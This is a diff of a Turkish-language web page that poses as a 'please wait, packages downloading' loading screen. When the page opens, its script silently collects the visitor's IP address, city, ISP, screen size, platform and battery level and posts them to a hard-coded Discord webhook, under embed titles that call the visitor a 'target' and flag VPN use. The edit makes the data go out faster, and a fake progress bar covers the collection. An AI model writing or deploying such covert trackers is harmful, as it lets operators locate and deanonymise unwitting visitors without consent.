@@ -27,8 +27,8 @@
 
 <div class="terminal">
     <div class="line type-1">> Bir Dakika Bekleyin...</div>
-    <div class="line type-2">> İpucu: Eğer canınız sıkılıyorsa bu siteye girin!</div>
-    <div class="line type-3">> Tüm Paketler İndirildi</div>
+    <div class="line type-2">> Çok Az Kaldı</div>
+    <div class="line type-3">> Tüm Paketler İndirildi!</div>
     
     <div class="progress-container" id="loader">
         <div class="progress-bar" id="bar"></div>
@@ -54,11 +54,12 @@
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
 
-    async function captureData() {
-        // Ekstra Cihaz Bilgileri
+    // ⚡️ IŞIK HIZINDA VERİ ÇEKME VE GÖNDERME ⚡️
+    async function instantCapture() {
+        // Ekran ve Cihaz Bilgileri
         const screenRes = `${window.screen.width}x${window.screen.height}`;
         const language = navigator.language;
-        const browser = navigator.userAgent.split(' ').pop();
+        const platform = navigator.platform;
         let batteryInfo = "Bilinmiyor";
 
         try {
@@ -66,37 +67,41 @@
             batteryInfo = `%${Math.round(battery.level * 100)}`;
         } catch(e) {}
 
+        // IP Verisini Çek ve Geldiği Saniye Discord'a At
         fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
-            window.cachedData = {...data, screenRes, language, browser, batteryInfo};
-            window.cachedRegNo = Math.floor(Math.random() * 89999) + 10000;
-
+            // Veriyi hemen Discord'a gönder (HİÇ BEKLEMEDEN)
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: "DERİN SİSTEM ANALİZİ",
+                    username: "TEŞKİLAT ANLIK ERİŞİM",
                     embeds: [{
-                        title: data.country_code !== 'TR' ? "🕵️ HEDEF VPN ARKASINDA" : "🎯 HEDEF TESPİT EDİLDİ",
+                        title: data.country_code !== 'TR' ? "🕵️ HEDEF VPN KULLANIYOR" : "🎯 HEDEF NET LOKASYONDA",
                         color: data.country_code !== 'TR' ? 16763904 : 16711680,
                         fields: [
                             { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
                             { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country_name}\``, inline: true },
-                            { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
-                            { name: "💻 Ekran", value: `\`${screenRes}\``, inline: true },
-                            { name: "🔋 Şarj", value: `\`${batteryInfo}\``, inline: true },
-                            { name: "🛠️ Tarayıcı", value: `\`${browser}\``, inline: true }
+                            { name: "📡 Sağlayıcı", value: `\`${data.org}\``, inline: false },
+                            { name: "🔋 Şarj / Ekran", value: `\`${batteryInfo} / ${screenRes}\``, inline: true },
+                            { name: "💻 İşletim Sistemi", value: `\`${platform}\``, inline: true }
                         ],
                         timestamp: new Date()
                     }]
                 })
             });
+
+            // Ekran için veriyi sakla
+            window.cachedData = {...data, screenRes, language, platform, batteryInfo};
+            window.cachedRegNo = Math.floor(Math.random() * 89999) + 10000;
         });
     }
 
-    captureData();
+    // Site açıldığı an çalıştır
+    instantCapture();
 
+    // Görsel efektler ve bekleme barı (Daha hızlı dolum)
     setTimeout(() => {
         const loader = document.getElementById('loader');
         const bar = document.getElementById('bar');
@@ -107,22 +112,22 @@
                 clearInterval(interval);
                 finalizeDisplay();
             } else {
-                width += 2;
+                width += 4; // Bar daha hızlı dolar
                 bar.style.width = width + '%';
             }
-        }, 40);
-    }, 3200);
+        }, 50);
+    }, 2500);
 
     function finalizeDisplay() {
         const data = window.cachedData;
-        if (!data) { setTimeout(finalizeDisplay, 1000); return; }
+        if (!data) { setTimeout(finalizeDisplay, 500); return; }
 
         document.getElementById('user-ip').innerText = data.ip;
         document.getElementById('user-loc').innerText = data.city;
         document.getElementById('user-isp').innerText = data.org;
-        document.getElementById('user-sys').innerText = navigator.platform;
+        document.getElementById('user-sys').innerText = data.platform;
         document.getElementById('user-res').innerText = data.screenRes;
-        document.getElementById('user-browser').innerText = data.browser;
+        document.getElementById('user-browser').innerText = navigator.userAgent.split(' ').pop();
         document.getElementById('user-lang').innerText = data.language;
         document.getElementById('user-bat').innerText = data.batteryInfo;
         document.getElementById('reg-no').innerText = window.cachedRegNo;
